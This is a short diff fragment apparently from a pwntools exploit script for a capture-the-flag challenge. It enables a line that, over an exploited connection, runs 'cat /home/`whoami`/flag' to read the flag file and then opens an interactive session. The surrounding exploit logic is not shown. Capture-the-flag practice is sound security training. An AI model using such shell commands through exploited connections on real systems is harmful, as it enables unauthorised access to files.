@@ -70,6 +70,7 @@ up(p)
 bea()
 bea()
 
-#y.sendline('cat /home/`whoami`/flag')
+
+y.sendline('cat /home/`whoami`/flag')
 
 y.interactive()
